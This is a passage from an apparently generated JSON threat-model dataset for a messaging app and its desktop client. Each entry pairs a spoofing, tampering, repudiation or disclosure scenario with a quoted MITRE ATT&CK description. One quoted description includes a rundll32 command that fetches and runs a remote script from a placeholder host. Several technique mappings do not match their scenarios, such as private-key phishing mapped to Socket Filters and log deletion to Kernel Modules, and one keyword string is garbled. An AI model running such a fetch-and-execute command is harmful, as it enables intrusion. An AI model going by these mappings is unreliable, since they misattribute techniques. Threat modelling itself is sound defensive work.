                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker manipulates the application's update process to install a privileged backdoor application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can spoof the update source.",
                    "Role": "Attacker",
                    "Condition": "When update channels are not secured."
                },
                {
                    "Assumption": "The application does not verify the integrity of updates.",
                    "Role": "Application Developer",
                    "Condition": "If updates are not digitally signed."
                },
                {
                    "Assumption": "Users execute updates without verifying authenticity.",
                    "Role": "User",
                    "Condition": "When users trust update prompts without question."
                }
            ],
            "Potential Impact": "Installation of malware leading to elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "Update Mechanism Exploit",
                "Backdoor Installation",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake companion desktop client to trick the primary device into establishing a trust relationship.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can produce a convincingly crafted fake desktop client.",
                    "Role": "Attacker",
                    "Condition": "The fake client is not distinguishable from a legitimate client by the primary device."
                },
                {
                    "Assumption": "The user does not verify the authenticity of the desktop client.",
                    "Role": "User",
                    "Condition": "User fails to check or cannot check the validity of the desktop client."
                },
                {
                    "Assumption": "The system does not enforce strict validation of client certificates.",
                    "Role": "System Designer",
                    "Condition": "The system allows weak or no validation of identity keys."
                }
            ],
            "Potential Impact": "Unauthorized access to user data and conversations.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing techniques to obtain the user's private key, allowing them to impersonate the user.",
            "Assumptions": [
                {
                    "Assumption": "The user can be convinced to disclose their private key.",
                    "Role": "User",
                    "Condition": "The user is susceptible to phishing attacks or social engineering."
                },
                {
                    "Assumption": "The attacker has access to the user's communication channels (email, messaging).",
                    "Role": "Attacker",
                    "Condition": "The attacker can send messages to the user."
                },
                {
                    "Assumption": "Users are not informed or aware of the importance of their private keys.",
                    "Role": "System Designer",
                    "Condition": "Lack of user education or awareness programs."
                }
            ],
            "Potential Impact": "Impersonation leading to unauthorized access and information disclosure.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential access",
                "social engineering",
                "network"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts initial key exchange between devices and inserts their own keys.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept network traffic between devices.",
                    "Role": "Attacker",
                    "Condition": "Active presence within the same network or ability to perform man-in-the-middle attacks."
                },
                {
                    "Assumption": "The initial key exchange is vulnerable to interception.",
                    "Role": "System Designer",
                    "Condition": "Weaknesses in key exchange protocols."
                },
                {
                    "Assumption": "Users do not verify key fingerprints.",
                    "Role": "User",
                    "Condition": "Users skip manual verification steps."
                }
            ],
            "Potential Impact": "Compromised encryption leading to unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle\u201d, \u201ccryptographic protocols",
                "network",
                "initial access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a primary device and modifies the SQLite database containing encryption keys.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the device storing the database.",
                    "Role": "Attacker",
                    "Condition": "The device is left unattended or improperly secured."
                },
                {
                    "Assumption": "The SQLite database containing sensitive information is not adequately protected.",
                    "Role": "System Designer",
                    "Condition": "No encryption or weak encryption of database contents."
                },
                {
                    "Assumption": "No tamper-evident mechanisms are in place.",
                    "Role": "System Designer",
                    "Condition": "Lack of measures to detect tampering after it occurs."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to potential data breaches and misinformation.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "physical access",
                "database",
                "credential access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the desktop client's update mechanism to deploy malicious code.",
            "Assumptions": [
                {
                    "Assumption": "The update mechanism is susceptible to exploitation (e.g., it doesn\u2019t use strong cryptographic verification).",
                    "Role": "System Designer",
                    "Condition": "The update process has inherent vulnerabilities."
                },
                {
                    "Assumption": "Users install updates without verifying their source or integrity.",
                    "Role": "User",
                    "Condition": "Users are not encouraged or required to verify updates."
                },
                {
                    "Assumption": "The application does not enforce strict control over the update server.",
                    "Role": "System Administrator",
                    "Condition": "Update server can be compromised or misused."
                }
            ],
            "Potential Impact": "Malicious code execution leading to unauthorized data access and information disclosure.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "update process",
                "software supply chain",
                "malware"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies application binaries during the installation process to introduce backdoors.",
            "Assumptions": [
                {
                    "Assumption": "The attacker intercepts the download and installation process.",
                    "Role": "Attacker",
                    "Condition": "Control over or access to the user's network traffic."
                },
                {
                    "Assumption": "Users download software from untrustworthy sources.",
                    "Role": "User",
                    "Condition": "Lack of awareness or education on safe downloading practices."
                },
                {
                    "Assumption": "Application binaries are not verified for integrity.",
                    "Role": "System Designer",
                    "Condition": "The system does not enforce cryptographic sig verification."
                }
            ],
            "Potential Impact": "Unauthorized access and control over user data and communications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software installation",
                "backdoor",
                "malware"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny having sent specific messages due to lack of message integrity checks and logging.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks robust logging and message integrity checks.",
                    "Role": "System Designer",
                    "Condition": "No non-repudiation mechanisms in place."
                },
                {
                    "Assumption": "There is no cryptographic binding of messages to sender.",
                    "Role": "System Designer",
                    "Condition": "Missing digital signatures on messages."
                },
                {
                    "Assumption": "Users could exploit the lack of evidence to deny actions.",
                    "Role": "User",
                    "Condition": "Intent to deny actions or messages knowingly or unknowingly."
                }
            ],
            "Potential Impact": "Potential legal or communication disputes without proof of message origin.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "message integrity",
                "logging",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attackers inject fake messages into conversation streams, and users deny sending them.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the capability to inject messages into the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Access to the communication infrastructure or improper security controls."
                },
                {
                    "Assumption": "There is no verification mechanism for the integrity of message sequences.",
                    "Role": "System Designer",
                    "Condition": "The communication protocol lacks sequence integrity verification."
                },
                {
                    "Assumption": "Injected messages are indistinguishable from legitimate messages.",
                    "Role": "Victim",
                    "Condition": "The messages lack identifiers for integrity validation."
                }
            ],
            "Potential Impact": "Compromise of data integrity leading to mistrust in the communication system.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "message injection",
                "data integrity",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A disgruntled employee deletes logging files to erase proof of unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "The employee has access to system logs.",
                    "Role": "Insider",
                    "Condition": "Insufficient access control or monitoring of privileged accounts."
                },
                {
                    "Assumption": "Logging mechanisms do not have tamper-proofing.",
                    "Role": "System Designer",
                    "Condition": "Logs are stored without adequate protection against tampering."
                },
                {
                    "Assumption": "No real-time monitoring or alerting mechanisms are in place.",
                    "Role": "System Administrator",
                    "Condition": "Failure to implement real-time detection and alert systems."
                }
            ],
            "Potential Impact": "Deletion of evidence leading to inability to enforce accountability or trace actions.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log tampering",
                "data deletion",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a zero-day vulnerability in the encryption protocol to gain access to message content.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has knowledge of and can exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Exploiting the vulnerability before it is patched."
                },
                {
                    "Assumption": "The system relies on the compromised encryption protocol.",
                    "Role": "System Designer",
                    "Condition": "The system uses an insecure or flawed encryption protocol."
                },
                {
                    "Assumption": "There are no mitigating controls to detect or block exploitation.",
                    "Role": "System Administrator",
                    "Condition": "Lack of intrusion detection or prevention systems."
                }
            ],
            "Potential Impact": "Confidential data exposure through message interception.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "encryption",
                "exploit",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker gains access to an unencrypted backup of database files containing sensitive user information.",
            "Assumptions": [
                {
                    "Assumption": "Backups are stored without encryption.",
                    "Role": "System Designer",
                    "Condition": "Backup process lacks encryption protocols."
                },
                {
                    "Assumption": "The attacker can access backup storage locations.",
                    "Role": "Attacker",
                    "Condition": "Improperly secured backup storage."
                },
                {
                    "Assumption": "There is no access control to prevent unauthorized access to backups.",
                    "Role": "System Administrator",
                    "Condition": "Lack of proper access controls and monitoring."
                }
            ],
            "Potential Impact": "Exposure of sensitive user information including messages and credentials.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "backup",
                "database",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive messages are logged in plaintext in server logs due to misconfiguration.",
            "Assumptions": [
                {
                    "Assumption": "The server has improper logging configuration.",
                    "Role": "System Administrator",
                    "Condition": "Logging sensitive information in plaintext."
                },
                {
                    "Assumption": "The attacker can access or intercept server logs.",
                    "Role": "Attacker",
                    "Condition": "Access to servers or logs through unauthorized means."
                },
                {
                    "Assumption": "No monitoring or alerting of log access is implemented.",
                    "Role": "System Designer",
                    "Condition": "Absence of proper log management and security measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user messages.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "logging",
                "plaintext storage",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
